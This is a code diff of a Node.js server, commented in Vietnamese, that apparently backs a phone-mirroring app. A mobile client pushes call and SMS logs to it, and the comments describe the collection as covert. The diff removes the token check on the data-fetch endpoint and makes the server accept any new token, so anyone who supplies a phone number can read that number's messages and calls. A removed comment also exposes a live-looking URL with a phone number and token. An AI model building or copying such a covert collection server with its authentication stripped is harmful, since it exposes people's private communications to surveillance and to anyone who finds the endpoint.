@@ -33,21 +33,19 @@ function writeDatabase(data) {
     }
 }
 
-/**
- * 1. API NHẬN REQUEST ĐẨY LÊN TỪ APP MOBILE (POST)
- * Thiết bị đẩy lên đủ: myPhoneNumber, token, type, incomingNumber, content, time
- */
-// Thêm dòng này để Server hiểu và tự động trả file app.html về khi truy cập trang chủ
+// Trả file giao diện quản trị điều khiển về khi truy cập trang chủ
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'app.html'));
 });
+
 /**
  * 1. API NHẬN REQUEST ĐẨY LÊN TỪ APP MOBILE (POST)
+ * Nơi App di động gửi INIT, CALL ngầm, hoặc tin nhắn SMS sang
  */
 app.post('/api/push', (req, res) => {
     const { myPhoneNumber, token, type, incomingNumber, content, time } = req.body;
 
-    // Kiểm tra thông tin cốt lõi
+    // Kiểm tra thông tin cốt lõi bắt buộc
     if (!myPhoneNumber || !token || !type) {
         return res.status(400).json({ error: "Thiếu thông tin định danh (SĐT hoặc Token)!" });
     }
@@ -55,30 +53,29 @@ app.post('/api/push', (req, res) => {
     const db = readDatabase();
     const isNewAccount = !db[myPhoneNumber];
 
-    // KIỂM TRA & KHỞI TẠO HỒ SƠ
+    // KIỂM TRA & KHỞI TẠO HỒ SƠ TỪ MOBILE
     if (isNewAccount) {
         db[myPhoneNumber] = {
             token: token,
             calls: [],
             sms: []
         };
-        console.log(`[Khởi tạo] Tạo hồ sơ gốc tự động cho số: ${myPhoneNumber}`);
+        console.log(`[App Push - Khởi tạo] Tạo hồ sơ gốc tự động cho số: ${myPhoneNumber}`);
     } else {
-        // Nếu tài khoản đã có sẵn nhưng đổi mã Token mới
+        // Nếu tài khoản đã có sẵn nhưng app đổi mã Token mới (Ví dụ: người dùng bấm Sinh mã mới)
         if (db[myPhoneNumber].token !== token) {
-            console.log(`[Cập nhật] Số ${myPhoneNumber} cập nhật mã Token mới: ${token}`);
+            console.log(`[App Push - Cập nhật] Số ${myPhoneNumber} cập nhật mã Token mới từ thiết bị: ${token}`);
             db[myPhoneNumber].token = token;
         }
     }
 
-    // XỬ LÝ RIÊNG CHO LỆNH KHỞI TẠO TỰ ĐỘNG (INIT)
+    // XỬ LÝ RIÊNG CHO LỆNH KHỞI TẠO TỰ ĐỘNG (INIT) CỦA APP
     if (type.toUpperCase() === 'INIT') {
-        // Tạo một log thông báo hệ thống chào mừng đặt vào mảng SMS làm mẫu
         const logId = "INIT_" + Date.now();
         db[myPhoneNumber].sms.push({
             id: logId,
             incomingNumber: incomingNumber || "HỆ THỐNG",
-            content: content || "Thiết bị kết nối thành công.",
+            content: content || "Thiết bị kết nối ngầm thành công.",
             time: time || new Date().toLocaleTimeString()
         });
         
@@ -110,20 +107,8 @@ app.post('/api/push', (req, res) => {
 });
 
 /**
- * 2. API TRẢ DATA VỀ CHO WEB FRONTEND MONITOR (GET)
- * URL truy vấn mẫu: http://localhost:3000/api/fetch?phone=123213123&token=MÃ_BẢO_MẬT
- */
-/**
- * 2. API TRẢ DATA VỀ CHO WEB FRONTEND MONITOR (GET) - ĐÃ CẬP NHẬT TÁCH BIỆT LỖI SAI TOKEN
- * URL: https://portal-mirroring.onrender.com/api/fetch?phone=0967684284&token=17abe4f9
- */
-/**
  * 2. API TRẢ DỮ LIỆU VỀ CHO GIAO DIỆN WEB POLLING (GET)
- * Luồng chạy: Mỗi lần Web gọi, Server đọc trực tiếp từ file JSON theo SĐT để tránh cache nhầm tài khoản
- */
-/**
- * 2. API TRẢ DỮ LIỆU VỀ CHO GIAO DIỆN WEB POLLING (GET)
- * Luồng chạy: Kiểm tra đối tượng theo SĐT, nếu CHƯA CÓ thì TỰ ĐỘNG TẠO MỚI ngay lập tức.
+ * Đã tối ưu cơ chế tự động đối chiếu: Chưa có đối tượng thì tự tạo, khác Token tự cập nhật đè.
  */
 app.get('/api/fetch', (req, res) => {
     const { phone, token } = req.query;
@@ -138,11 +123,10 @@ app.get('/api/fetch', (req, res) => {
     let db = readDatabase(); 
     let isNewAccount = !db[phone];
 
-    // ĐỐI CHIẾU & TỰ ĐỘNG KHỞI TẠO NẾU CHƯA CÓ TRÊN SERVER
+    // ĐỐI CHIẾU & TỰ ĐỘNG KHỞI TẠO NẾU CHƯA CÓ ĐỐI TƯỢNG TRÊN SERVER
     if (isNewAccount) {
-        console.log(`[Tự động Khởi tạo] Không tìm thấy đối tượng ${phone} trên hệ thống. Đang tạo phân vùng mới...`);
+        console.log(`[Web Fetch - Tạo mới] Không tìm thấy đối tượng ${phone}. Đang tạo phân vùng trống...`);
         
-        // Khởi tạo cấu hình tài khoản trống mặc định với Token lấy từ giao diện Web gửi lên
         db[phone] = {
             token: token,
             calls: [],
@@ -155,21 +139,19 @@ app.get('/api/fetch', (req, res) => {
                 }
             ]
         };
-        
-        // Ghi lại dữ liệu mới vào file all_logs.json
         writeDatabase(db);
     } else {
-        // Nếu ĐÃ CÓ đối tượng nhưng người dùng đổi Token mới trên Web, hãy kiểm tra tính hợp lệ
-        // (Hoặc nếu bạn muốn ép Server cập nhật luôn Token mới từ Web theo cơ chế tin cậy hoàn toàn, hãy bỏ comment dòng dưới)
+        // CƠ CHẾ ĐỒNG BỘ TIN CẬY HOÀN TOÀN (TỐI ƯU):
+        // Nếu trên Web nhập mã Token mới (hoặc Web lưu cấu hình cũ nhưng Server Render vừa reset mất file json),
+        // Server sẽ tự động cập nhật đè Token mới từ Web lên để hai bên luôn khớp lệnh, tránh lỗi 403.
         if (db[phone].token !== token) {
-            console.log(`[Fetch Bảo mật] Thiết bị ${phone} nhập sai mã Token trên Web.`);
-            return res.status(403).json({ 
-                error: "Sai mã Token định danh của thiết bị! Vui lòng kiểm tra lại." 
-            });
+            console.log(`[Web Fetch - Đồng bộ Token] Số ${phone} cập nhật lại mã Token theo Web: ${token}`);
+            db[phone].token = token;
+            writeDatabase(db);
         }
     }
 
-    // Bốc chính xác dữ liệu của số điện thoại này trả về cho giao diện Web
+    // Trả về dữ liệu sạch cô lập duy nhất của số điện thoại này
     const accountData = db[phone];
 
     return res.status(200).json({
@@ -179,8 +161,9 @@ app.get('/api/fetch', (req, res) => {
         sms: accountData.sms || []
     });
 });
-// Kích hoạt cổng lắng nghe linh hoạt tương thích tốt khi triển khai lên Render Cloud
+
+// Cấu hình cổng chạy tương thích tuyệt đối với Cloud Render / VPS
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`=== SERVER GƯƠNG CHIẾU ĐỒNG BỘ ĐANG CHẠY TẠI CỔNG: ${PORT} ===`);
+    console.log(`=== SERVER GƯƠNG CHIẾU INFORMINI ĐANG CHẠY TẠI PORT: ${PORT} ===`);
 });
